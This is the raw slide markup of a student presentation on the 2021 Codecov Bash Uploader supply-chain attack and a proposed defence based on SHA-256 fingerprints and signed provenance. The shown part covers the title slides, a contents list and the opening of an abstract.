          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="639157"/>
            <a:ext cx="9144000" cy="6210670"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId32">
              <a:extLst>
                <a:ext uri="{BEBA8EAE-BF5A-486C-A8C5-ECC9F3942E4B}">
                  <a14:imgProps xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                    <a14:imgLayer r:embed="rId33">
                      <a14:imgEffect>
                        <a14:brightnessContrast bright="6000" contrast="32000"/>
                      </a14:imgEffect>
                      <a14:imgEffect>
                        <a14:saturation sat="0"/>
                      </a14:imgEffect>
                      <a14:imgEffect>
                        <a14:sharpenSoften amount="2000"/>
                      </a14:imgEffect>
                    </a14:imgLayer>
                  </a14:imgProps>
                </a:ext>
              </a:extLst>
            </a:blip>
            <a:srcRect/>
            <a:tile tx="0" ty="0" sx="100000" sy="100000" flip="none" algn="tl"/>
          </a:blipFill>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 name="TextBox 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{59BC6866-169D-418C-42E5-E7327A514810}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="-26713"/>
            <a:ext cx="91440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lvl1pPr>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Verdana" panose="020B0804030504040204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202090204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Verdana" panose="020B0804030504040204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202090204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Verdana" panose="020B0804030504040204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202090204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Verdana" panose="020B0804030504040204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202090204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Verdana" panose="020B0804030504040204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202090204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="25146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6pPr>
            <a:lvl7pPr marL="29718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7pPr>
            <a:lvl8pPr marL="34290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8pPr>
            <a:lvl9pPr marL="38862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9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:ln w="10541" cmpd="sng">
                  <a:solidFill>
                    <a:srgbClr val="5B9BD5">
                      <a:shade val="88000"/>
                      <a:satMod val="110000"/>
                    </a:srgbClr>
                  </a:solidFill>
                  <a:prstDash val="solid"/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>BMS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" dirty="0">
                <a:ln w="10541" cmpd="sng">
                  <a:solidFill>
                    <a:srgbClr val="5B9BD5">
                      <a:shade val="88000"/>
                      <a:satMod val="110000"/>
                    </a:srgbClr>
                  </a:solidFill>
                  <a:prstDash val="solid"/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:ln w="10541" cmpd="sng">
                  <a:solidFill>
                    <a:srgbClr val="5B9BD5">
                      <a:shade val="88000"/>
                      <a:satMod val="110000"/>
                    </a:srgbClr>
                  </a:solidFill>
                  <a:prstDash val="solid"/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>INSTITUTE OF TECHNOLOGY AND MANAGEMENT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:ln w="10541" cmpd="sng">
                <a:solidFill>
                  <a:srgbClr val="5B9BD5">
                    <a:shade val="88000"/>
                    <a:satMod val="110000"/>
                  </a:srgbClr>
                </a:solidFill>
                <a:prstDash val="solid"/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="002060"/>
              </a:solidFill>
              <a:latin typeface="Lucida Sans" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8" descr="C:\Users\Placement\Downloads\Logos\BMSIT LOGO Sept 2015.jpg">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7F75364C-D5A6-2B6E-FA9F-0DEB716F6C78}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId34" cstate="print">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="139148" y="17783"/>
            <a:ext cx="628128" cy="57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Image result for india">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D44BC56D-C7FE-8A1B-8A3B-A86714D1EF5A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId35" cstate="print">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect l="19693" r="16352" b="17179"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8503509" y="103921"/>
            <a:ext cx="461587" cy="489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71689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661" r:id="rId29"/>
    <p:sldLayoutId id="2147483662" r:id="rId30"/>
  </p:sldLayoutIdLst>
  <p:hf hdr="0" ftr="0"/>
  <p:txStyles>
    <p:titleStyle>
      <a:lvl1pPr algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:lnSpc>
          <a:spcPct val="80000"/>
        </a:lnSpc>
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:buNone/>
        <a:defRPr sz="4200" b="0" i="0" kern="1200" spc="-150" baseline="0">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mj-lt"/>
          <a:ea typeface="+mj-ea"/>
          <a:cs typeface="+mj-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
    </p:titleStyle>
    <p:bodyStyle>
      <a:lvl1pPr marL="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1pPr>
      <a:lvl2pPr marL="17145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2pPr>
      <a:lvl3pPr marL="34290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3pPr>
      <a:lvl4pPr marL="51435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4pPr>
      <a:lvl5pPr marL="68580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E75B8-16FE-459E-8FEE-76CC5E9BA9CF}" type="datetime1">
              <a:rPr lang="en-IN" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>08-09-2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{58CAE0E1-5C16-469C-80A6-45E1950F1503}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="364067" y="3310128"/>
            <a:ext cx="8322733" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Open Sans" panose="020B0606030504020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Presented By</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="TextBox 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="211015" y="897467"/>
            <a:ext cx="8707901" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-IN" sz="36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BCS701 (Information and Network Security)</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="36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endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-IN"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endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0">
              <a:ln w="0"/>
              <a:effectLst>
                <a:outerShdw blurRad="38100" dist="19050" dir="2700000" algn="tl" rotWithShape="0">
                  <a:schemeClr val="dk1">
                    <a:alpha val="40000"/>
                  </a:schemeClr>
                </a:outerShdw>
              </a:effectLst>
              <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EFE5F17E-FF89-96F9-B21D-14F8510FE325}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2272107" y="4617720"/>
            <a:ext cx="4585716" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
                <a:ea typeface="Open Sans" panose="020B0606030504020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Under the guidance of</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              <a:ea typeface="Open Sans" panose="020B0606030504020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{01DF88FB-6552-969E-6263-9F680DDAE8DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1572768"/>
            <a:ext cx="8412480" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-IN" sz="20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CCA: Real-World Security Breach Analysis &amp; Cryptographic Solution Design</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{809EDA3D-ED62-9570-6D9B-67B6930F72BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="2011680"/>
            <a:ext cx="8412480" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-IN" sz="1600" dirty="0" i="1">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Case study: Codecov Bash Uploader supply-chain attack (2021)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2395728"/>
            <a:ext cx="8046720" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2100" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Cryptographically Verified Software Supply Chain for Preventing Codecov-Style Supply-Chain Attacks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="3675887"/>
            <a:ext cx="6400800" cy="86868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Name 1 (USN)     Name 2 (USN)     Name 3 (USN)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0" i="1">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>edit with your team's names and USNs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="4956048"/>
            <a:ext cx="5486400" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Prof. Sonnegowda K</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Assistant Professor, Dept. of ISE, BMSIT&amp;M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EC0164-0102-408C-A95F-BA5869EBAB0A}" type="datetime1">
              <a:rPr lang="en-IN" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:t>08-09-2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{58CAE0E1-5C16-469C-80A6-45E1950F1503}" type="slidenum">
              <a:rPr lang="en-IN" smtClean="0">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:tint val="75000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Title 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-448313" y="862870"/>
            <a:ext cx="3799268" cy="48939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n w="10541" cmpd="sng">
                  <a:solidFill>
                    <a:srgbClr val="5B9BD5">
                      <a:shade val="88000"/>
                      <a:satMod val="110000"/>
                    </a:srgbClr>
                  </a:solidFill>
                  <a:prstDash val="solid"/>
                </a:ln>
                <a:latin typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
                <a:ea typeface="MS Mincho" pitchFamily="49" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020503050405090304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Content</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ln w="10541" cmpd="sng">
                  <a:solidFill>
                    <a:srgbClr val="5B9BD5">
                      <a:shade val="88000"/>
                      <a:satMod val="110000"/>
                    </a:srgbClr>
                  </a:solidFill>
                  <a:prstDash val="solid"/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Cambria" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5ACF47DD-C739-1403-D772-26C292EF6574}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1188720" y="1463040"/>
            <a:ext cx="6949440" cy="4846320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>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Abstract &amp; Objectives</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The Codecov Incident (2021)</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Attack Flow &amp; Problem Statement</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Vulnerabilities &amp; Security Requirements</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Proposed Architecture</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Cryptographic Design</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Key Management &amp; Revocation</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Verification Engine &amp; CI/CD Gate</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Attack Simulation &amp; Live Demo</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Testing Results &amp; Dashboard</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Innovation &amp; Industry Relevance</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Conclusion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Abstract &amp; Objectives</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1417320"/>
            <a:ext cx="4160520" cy="48920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481328"/>
            <a:ext cx="3931920" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Abstract</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1847088"/>
            <a:ext cx="3931920" cy="4389120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>In 2021 an attacker used a leaked storage credential to modify Codecov's </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Bash Uploader</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>, which then sent CI secrets to an external server for about two months, over valid HTTPS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Our prototype: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SHA-256</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> fingerprint + </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SLSA-style provenance</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> → </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
